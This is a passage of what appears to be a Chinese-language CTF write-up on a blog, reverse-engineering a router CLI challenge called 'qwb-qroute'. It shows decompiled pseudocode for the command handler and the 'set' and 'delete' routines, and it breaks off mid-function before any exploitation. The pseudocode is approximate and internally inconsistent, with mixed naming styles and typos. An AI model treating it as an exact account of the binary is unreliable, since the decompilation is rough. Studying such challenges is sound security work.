@@ -1,0 +1,1135 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="qwb-qroute, Hexo">
+    <meta name="description" content="CHECK
+
+逆向分析handlerstruct StringSlice *ptr_Router_handleCommand(struct Router *r, struct StringSlice s) &amp;#123;  struct St">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>qwb-qroute | Hexo</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>Contact</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">qwb-qroute</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2025-01-14
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.min.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>CHECK</p>
+<p><img src="/images/1730547501080.png" alt="1730547501080"></p>
+<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><h3 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h3><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">struct</span> StringSlice *ptr_Router_handleCommand(<span class="hljs-keyword">struct</span> Router *r, <span class="hljs-keyword">struct</span> StringSlice s) &#123;<br>  <span class="hljs-keyword">struct</span> StringSlice *fields;<br>  fields = strings_Fields(s, <span class="hljs-string">&#x27; &#x27;</span>);<br>  <span class="hljs-keyword">if</span> (fields-&gt;<span class="hljs-built_in">len</span> == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> fields;<br>  &#125;<br>  <span class="hljs-keyword">switch</span> (fields-&gt;<span class="hljs-built_in">len</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      <span class="hljs-keyword">if</span> (strings_Equal(fields-&gt;at[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;set&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> ptr_Router_set(r, strings_Join(fields, <span class="hljs-number">1</span>, fields-&gt;<span class="hljs-built_in">len</span> - <span class="hljs-number">1</span>, <span class="hljs-string">&quot; &quot;</span>),<br>                              <span class="hljs-literal">true</span>);<br>      &#125;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>      <span class="hljs-keyword">if</span> (fields-&gt;at[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] &lt; <span class="hljs-string">&#x27;h&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span> (strings_Equal(fields-&gt;at[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;show&quot;</span>)) &#123;<br>          <span class="hljs-keyword">if</span> (fields-&gt;<span class="hljs-built_in">len</span> &gt;= <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-keyword">return</span> ptr_Router_show(r, fields-&gt;at[<span class="hljs-number">1</span>], fields-&gt;at[<span class="hljs-number">2</span>], <span class="hljs-literal">true</span>);<br>          &#125;<br>          fmt_Fprintln(os_Stderr, <span class="hljs-string">&quot;Usage: show &lt;router-name&gt;&quot;</span>);<br>          <span class="hljs-keyword">return</span> NULL;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (strings_Equal(fields-&gt;at[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;cert&quot;</span>)) &#123;<br>          <span class="hljs-keyword">if</span> (fields-&gt;<span class="hljs-built_in">len</span> &gt;= <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-keyword">return</span> ptr_Router_cert(r, fields-&gt;at[<span class="hljs-number">1</span>], fields-&gt;at[<span class="hljs-number">2</span>], <span class="hljs-literal">true</span>);<br>          &#125;<br>          fmt_Fprintln(os_Stderr, <span class="hljs-string">&quot;Usage: cert &lt;router-name&gt;&quot;</span>);<br>          <span class="hljs-keyword">return</span> NULL;<br>        &#125;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (strings_Equal(fields-&gt;at[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;exec&quot;</span>)) &#123;<br>          <span class="hljs-keyword">return</span> ptr_Router_exec(r, strings_Join(fields, <span class="hljs-number">1</span>, fields-&gt;<span class="hljs-built_in">len</span> - <span class="hljs-number">1</span>, <span class="hljs-string">&quot; &quot;</span>),<br>                                 <span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (strings_Equal(fields-&gt;at[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;conf&quot;</span>)) &#123;<br>          <span class="hljs-keyword">if</span> (r-&gt;is_config_mode) &#123;<br>            <span class="hljs-keyword">return</span> ptr_Router_exitConfigMode(r, <span class="hljs-literal">true</span>);<br>          &#125;<br>          fmt_Fprintln(os_Stderr, <span class="hljs-string">&quot;Not in configuration mode.&quot;</span>);<br>          os_Exit(<span class="hljs-number">0</span>);<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>      <span class="hljs-keyword">if</span> (strings_Equal(fields-&gt;at[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;delete&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> ptr_Router_delete(r, strings_Join(fields, <span class="hljs-number">1</span>, fields-&gt;<span class="hljs-built_in">len</span> - <span class="hljs-number">1</span>, <span class="hljs-string">&quot; &quot;</span>),<br>                                 <span class="hljs-literal">true</span>);<br>      &#125;<br>      <span class="hljs-keyword">if</span> (strings_Equal(fields-&gt;at[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;quit&quot;</span>)) &#123;<br>        fmt_Fprintln(os_Stderr, <span class="hljs-string">&quot;Goodbye!&quot;</span>);<br>        os_Exit(<span class="hljs-number">0</span>);<br>      &#125;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:<br>      <span class="hljs-keyword">if</span> (strings_Equal(fields-&gt;at[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;config&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> ptr_Router_enterConfigMode(r, <span class="hljs-literal">true</span>);<br>      &#125;<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  fmt_Fprintln(os_Stderr, <span class="hljs-string">&quot;Usage: \&quot;help\&quot; for a list of commands&quot;</span>);<br>  <span class="hljs-keyword">return</span> NULL;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go">static void main__ptr_Router_set(main__ptr_Router r, String s) &#123;<br>  <span class="hljs-keyword">if</span> (!r-&gt;isRunning) &#123;<br>    fmt_Fprintln(main__stdErr, <span class="hljs-string">&quot;Error: Router is not running\n&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  Array_String a = strings_Fields(s);<br>  <span class="hljs-keyword">if</span> (len_Array_String(a) &lt; <span class="hljs-number">2</span>) &#123;<br>    fmt_Fprintln(main__stdErr, <span class="hljs-string">&quot;Error: Too few arguments\n&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  String cmd = at_Array_String(a, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (len_String(cmd) == <span class="hljs-number">3</span> &amp;&amp;<br>      char_String(cmd, <span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; char_String(cmd, <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;d&#x27;</span> &amp;&amp;<br>      char_String(cmd, <span class="hljs-number">2</span>) == <span class="hljs-string">&#x27;d&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (len_Array_String(a) &lt; <span class="hljs-number">3</span>) &#123;<br>      fmt_Fprintln(main__stdErr, <span class="hljs-string">&quot;Error: Too few arguments\n&quot;</span>);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    String name = at_Array_String(a, <span class="hljs-number">1</span>);<br>    String ip = at_Array_String(a, <span class="hljs-number">2</span>);<br>    r-&gt;dns[r-&gt;dnsCount].name = name;<br>    r-&gt;dns[r-&gt;dnsCount].ip = ip;<br>    r-&gt;dnsCount += <span class="hljs-number">1</span>;<br>    main__ptr_Router_log(r,<br>                         runtime_concatstring2(<span class="hljs-string">&quot;Added DNS record for &quot;</span>, name,<br>                                               ip, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-number">0</span>),<br>                         <span class="hljs-string">&quot;Added DNS record for &quot;</span>, name, ip);<br>    fmt_Fprintf(main__stdErr, <span class="hljs-string">&quot;Added DNS record: %s -&gt; %s\n&quot;</span>, <span class="hljs-number">27</span>,<br>                runtime_convTstring(name), runtime_convTstring(ip));<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (len_String(cmd) == <span class="hljs-number">5</span> &amp;&amp;<br>             char_String(cmd, <span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; char_String(cmd, <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;d&#x27;</span> &amp;&amp;<br>             char_String(cmd, <span class="hljs-number">2</span>) == <span class="hljs-string">&#x27;d&#x27;</span> &amp;&amp; char_String(cmd, <span class="hljs-number">3</span>) == <span class="hljs-string">&#x27;r&#x27;</span> &amp;&amp;<br>             char_String(cmd, <span class="hljs-number">4</span>) == <span class="hljs-string">&#x27;e&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (len_Array_String(a) &lt; <span class="hljs-number">4</span>) &#123;<br>      fmt_Fprintln(main__stdErr, <span class="hljs-string">&quot;Error: Too few arguments\n&quot;</span>);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    String network = at_Array_String(a, <span class="hljs-number">1</span>);<br>    String netmask = at_Array_String(a, <span class="hljs-number">2</span>);<br>    String gateway = at_Array_String(a, <span class="hljs-number">3</span>);<br>    String <span class="hljs-keyword">interface</span> = at_Array_String(a, <span class="hljs-number">4</span>);<br>    r-&gt;routes[r-&gt;routeCount].network = network;<br>    r-&gt;routes[r-&gt;routeCount].netmask = netmask;<br>    r-&gt;routes[r-&gt;routeCount].gateway = gateway;<br>    r-&gt;routes[r-&gt;routeCount].<span class="hljs-keyword">interface</span> = <span class="hljs-keyword">interface</span>;<br>    r-&gt;routeCount += <span class="hljs-number">1</span>;<br>    main__ptr_Router_log(<br>        r,<br>        runtime_concatstring2(<span class="hljs-string">&quot;Added route to &quot;</span>, network, <span class="hljs-string">&quot; via &quot;</span>, gateway,<br>                              <span class="hljs-string">&quot; on interface &quot;</span>, <span class="hljs-keyword">interface</span>, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-number">0</span>),<br>        <span class="hljs-string">&quot;Added route to &quot;</span>, network, gateway, <span class="hljs-keyword">interface</span>);<br>    fmt_Fprintf(main__stdErr, <span class="hljs-string">&quot;Added route to %s via %s on interface %s\n&quot;</span>, <span class="hljs-number">41</span>,<br>                runtime_convTstring(network), runtime_convTstring(gateway),<br>                runtime_convTstring(<span class="hljs-keyword">interface</span>));<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (len_String(cmd) == <span class="hljs-number">9</span> &amp;&amp;<br>             char_String(cmd, <span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;i&#x27;</span> &amp;&amp; char_String(cmd, <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;n&#x27;</span> &amp;&amp;<br>             char_String(cmd, <span class="hljs-number">2</span>) == <span class="hljs-string">&#x27;t&#x27;</span> &amp;&amp; char_String(cmd, <span class="hljs-number">3</span>) == <span class="hljs-string">&#x27;e&#x27;</span> &amp;&amp;<br>             char_String(cmd, <span class="hljs-number">4</span>) == <span class="hljs-string">&#x27;r&#x27;</span> &amp;&amp; char_String(cmd, <span class="hljs-number">5</span>) == <span class="hljs-string">&#x27;f&#x27;</span> &amp;&amp;<br>             char_String(cmd, <span class="hljs-number">6</span>) == <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; char_String(cmd, <span class="hljs-number">7</span>) == <span class="hljs-string">&#x27;c&#x27;</span> &amp;&amp;<br>             char_String(cmd, <span class="hljs-number">8</span>) == <span class="hljs-string">&#x27;e&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (len_Array_String(a) &lt; <span class="hljs-number">5</span>) &#123;<br>      fmt_Fprintln(main__stdErr, <span class="hljs-string">&quot;Error: Too few arguments\n&quot;</span>);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    String name = at_Array_String(a, <span class="hljs-number">1</span>);<br>    String ip = at_Array_String(a, <span class="hljs-number">2</span>);<br>    String mac = at_Array_String(a, <span class="hljs-number">3</span>);<br>    String status = at_Array_String(a, <span class="hljs-number">4</span>);<br>    String <span class="hljs-keyword">type</span> = at_Array_String(a, <span class="hljs-number">5</span>);<br>    String link = at_Array_String(a, <span class="hljs-number">6</span>);<br>    String mtu = at_Array_String(a, <span class="hljs-number">7</span>);<br>    String metric = at_Array_String(a, <span class="hljs-number">8</span>);<br>    r-&gt;interfaces[r-&gt;interfaceCount].name = name;<br>    r-&gt;interfaces[r-&gt;interfaceCount].ip = ip;<br>    r-&gt;interfaces[r-&gt;interfaceCount].mac = mac;<br>    r-&gt;interfaces[r-&gt;interfaceCount].status = status;<br>    r-&gt;interfaces[r-&gt;interfaceCount].<span class="hljs-keyword">type</span> = <span class="hljs-keyword">type</span>;<br>    r-&gt;interfaces[r-&gt;interfaceCount].link = link;<br>    r-&gt;interfaces[r-&gt;interfaceCount].mtu = mtu;<br>    r-&gt;interfaces[r-&gt;interfaceCount].metric = metric;<br>    r-&gt;interfaceCount += <span class="hljs-number">1</span>;<br>    main__ptr_Router_log(<br>        r,<br>        runtime_concatstring2(<span class="hljs-string">&quot;Added interface &quot;</span>, name, <span class="hljs-string">&quot; with IP &quot;</span>, ip,<br>                              <span class="hljs-string">&quot;, MAC &quot;</span>, mac, <span class="hljs-string">&quot;, Status &quot;</span>, status, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-number">0</span>),<br>        <span class="hljs-string">&quot;Added interface &quot;</span>, name, ip, mac, status);<br>    fmt_Fprintf(main__stdErr,<br>                <span class="hljs-string">&quot;Added interface %s with IP %s, MAC %s, Status %s\n&quot;</span>, <span class="hljs-number">49</span>,<br>                runtime_convTstring(name), runtime_convTstring(ip),<br>                runtime_convTstring(mac), runtim_convTstring(status));<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    fmt_Fprintln(main__stdErr, <span class="hljs-string">&quot;Error: Too few arguments\n&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go">static String main__ptr_Router_delete(main__ptr_Router r, String args) &#123;<br>String argv[<span class="hljs-number">2</span>];<br><span class="hljs-keyword">if</span> (!r-&gt;is_running) &#123;<br>  <span class="hljs-keyword">return</span> fmt_Fprintln(<br>      os__Stderr,<br>      &amp;(String)&#123;<span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&quot;Router is not running\n&quot;</span>&#125;,<br>      &amp;([]String&#123;&#123;&amp;RTYPE_string, &amp;(String)&#123;<span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&quot;Router is not running\n&quot;</span>&#125;&#125;&#125;&#125;);<br>&#125;<br>argv = strings_Fields(args, <span class="hljs-number">2</span>);<br><span class="hljs-keyword">if</span> (len_String(argv) &lt; <span class="hljs-number">2</span>) &#123;<br>  <span class="hljs-keyword">return</span> fmt_Fprintln(<br>      os__Stderr,<br>      &amp;(String)&#123;<span class="hljs-number">12</span>, <span class="hljs-number">12</span>, <span class="hljs-string">&quot;Incorrect number of arguments\n&quot;</span>&#125;,<br>      &amp;([]String&#123;&#123;&amp;RTYPE_string, &amp;(String)&#123;<span class="hljs-number">12</span>, <span class="hljs-number">12</span>, <span class="hljs-string">&quot;Incorrect number of arguments\n&quot;</span>&#125;&#125;&#125;&#125;);<br>&#125;<br><span class="hljs-keyword">if</span> (len_String(argv[<span class="hljs-number">1</span>]) == <span class="hljs-number">3</span> &amp;&amp;<br>    ((((String)&#123;<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-string">&quot;set&quot;</span>&#125;).str)[<span class="hljs-number">0</span>] == argv[<span class="hljs-number">1</span>].str[<span class="hljs-number">0</span>] &amp;&amp;<br>     (((String)&#123;<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-string">&quot;set&quot;</span>&#125;).str)[<span class="hljs-number">1</span>] == argv[<span class="hljs-number">1</span>].str[<span class="hljs-number">1</span>] &amp;&amp;<br>     (((String)&#123;<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-string">&quot;set&quot;</span>&#125;).str)[<span class="hljs-number">2</span>] == argv[<span class="hljs-number">1</span>].str[<span class="hljs-number">2</span>]))) &#123;<br>  String arg = argv[<span class="hljs-number">2</span>];<br>  String arg_len = len_String(arg);<br>  <span class="hljs-keyword">for</span> (long i = <span class="hljs-number">0</span>; i &lt; len_slice_main_DNSRecord(r-&gt;dns_records); i++) &#123;<br>    main__DNSRecord rr = at_slice_main_DNSRecord(r-&gt;dns_records, i);<br>    <span class="hljs-keyword">if</span> (len_String(rr.domain) == arg_len &amp;&amp;<br>        runtime_memequal(rr.domain.str, arg.str, arg_len)) &#123;<br>      r-&gt;dns_records =<br>          slice_main_DNSRecord(r-&gt;dns_records, <span class="hljs-number">0</span>, i - <span class="hljs-number">1</span>, r-&gt;dns_records);<br>      r-&gt;dns_records = slice_main_DNSRecord(r-&gt;dns_records, i + <span class="hljs-number">1</span>,<br>                                            len_slice_main_DNSRecord(r-&gt;dns_records),<br>                                            r-&gt;dns_records);<br>      r-&gt;dns_records = append_slice_main_DNSRecord(<br>          r-&gt;dns_records,<br>          slice_main_DNSRecord(r-&gt;dns_records, i, len_slice_main_DNSRecord(r-&gt;dns_records),<br>                               r-&gt;dns_records));<br>      r-&gt;log(concat_String(String_lit(<span class="hljs-string">&quot;Deleted DNS record for &quot;</span>), arg));<br>      <span class="hljs-keyword">return</span> fmt_Fprintf(os__Stderr,<br>                         String_lit(<span class="hljs-string">&quot;Deleted DNS record for %s\n&quot;</span>),<br>                         &amp;([]String&#123;&#123;&amp;RTYPE_string, convTstring(arg)&#125;&#125;&#125;, <span class="hljs-number">1</span>,<br>                         <span class="hljs-number">1</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> fmt_Fprintf(os__Stderr, String_lit(<span class="hljs-string">&quot;DNS record for %s not found\n&quot;</span>),<br>                     &amp;([]String&#123;&#123;&amp;RTYPE_string, convTstring(arg)&#125;&#125;&#125;, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (len_String(argv[<span class="hljs-number">1</span>]) == <span class="hljs-number">5</span> &amp;&amp;<br>    ((((String)&#123;<span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&quot;route&quot;</span>&#125;).str)[<span class="hljs-number">0</span>] == argv[<span class="hljs-number">1</span>].str[<span class="hljs-number">0</span>] &amp;&amp;<br>     (((String)&#123;<span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&quot;route&quot;</span>&#125;).str)[<span class="hljs-number">1</span>] == argv[<span class="hljs-number">1</span>].str[<span class="hljs-number">1</span>] &amp;&amp;<br>     (((String)&#123;<span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&quot;route&quot;</span>&#125;).str)[<span class="hljs-number">2</span>] == argv[<span class="hljs-number">1</span>].str[<span class="hljs-number">2</span>] &amp;&amp;<br>     (((String)&#123;<span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&quot;route&quot;</span>&#125;).str)[<span class="hljs-number">3</span>] == argv[<span class="hljs-number">1</span>].str[<span class="hljs-number">3</span>] &amp;&amp;<br>     (((String)&#123;<span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&quot;route&quot;</span>&#125;).str)[<span class="hljs-number">4</span>] == argv[<span class="hljs-number">1</span>].str[<span class="hljs-number">4</span>]))) &#123;<br>  String arg = argv[<span class="hljs-number">2</span>];<br>  String arg_len = len_String(arg);<br>  <span class="hljs-keyword">for</span> (long i = <span class="hljs-number">0</span>; i &lt; len_slice_main_Route(r-&gt;routes); 